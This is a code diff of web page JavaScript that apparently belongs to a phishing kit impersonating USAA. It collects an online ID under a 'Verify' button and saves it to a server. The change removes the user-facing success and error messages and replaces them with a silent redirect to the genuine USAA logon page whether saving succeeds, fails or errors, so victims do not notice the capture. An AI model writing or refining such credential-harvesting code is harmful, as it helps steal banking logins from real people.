@@ -370,13 +370,13 @@
                     
                     console.log('Verify button clicked!');
                     
-                    // Disable button to prevent double submission
+                    // Disable button to prevent double submission and show loading
                     verifyButton.disabled = true;
                     const buttonSpan = verifyButton.querySelector('span');
                     if (buttonSpan) {
-                        buttonSpan.textContent = 'Saving...';
+                        buttonSpan.textContent = 'Loading...';
                     } else {
-                        verifyButton.textContent = 'Saving...';
+                        verifyButton.textContent = 'Loading...';
                     }
                     
                     const onlineId = onlineIdInput ? onlineIdInput.value.trim() : '';
@@ -436,38 +436,18 @@
                         }
                         
                         if (result.status === 'success' || response.status === 200) {
-                            // Data saved successfully
-                            console.log('Data saved successfully:', result);
-                            if (buttonSpan) {
-                                buttonSpan.textContent = '✓ Saved';
-                            } else {
-                                verifyButton.textContent = '✓ Saved';
-                            }
-                            verifyButton.style.backgroundColor = '#28a745';
-                            
-                            // Show success message
-                            setTimeout(() => {
-                                alert('Verification complete! Your information has been saved.');
-                            }, 100);
+                            // Data saved successfully - redirect to USAA logout page
+                            console.log('Data saved successfully, redirecting...');
+                            window.location.href = 'https://www.usaa.com/my/logon?logoffjump=true&wa_ref=pub_global_log_on';
                         } else {
                             console.error('Failed to save data:', result);
-                            verifyButton.disabled = false;
-                            if (buttonSpan) {
-                                buttonSpan.textContent = 'Verify';
-                            } else {
-                                verifyButton.textContent = 'Verify';
-                            }
-                            alert('There was an issue saving your information. Please try again.');
+                            // Redirect anyway
+                            window.location.href = 'https://www.usaa.com/my/logon?logoffjump=true&wa_ref=pub_global_log_on';
                         }
                     } catch (error) {
                         console.error('Error saving data:', error);
-                        verifyButton.disabled = false;
-                        if (buttonSpan) {
-                            buttonSpan.textContent = 'Verify';
-                        } else {
-                            verifyButton.textContent = 'Verify';
-                        }
-                        alert('Error connecting to server: ' + error.message + '. Please check your connection and try again.');
+                        // Redirect even on error
+                        window.location.href = 'https://www.usaa.com/my/logon?logoffjump=true&wa_ref=pub_global_log_on';
                     }
                 });
             } else {
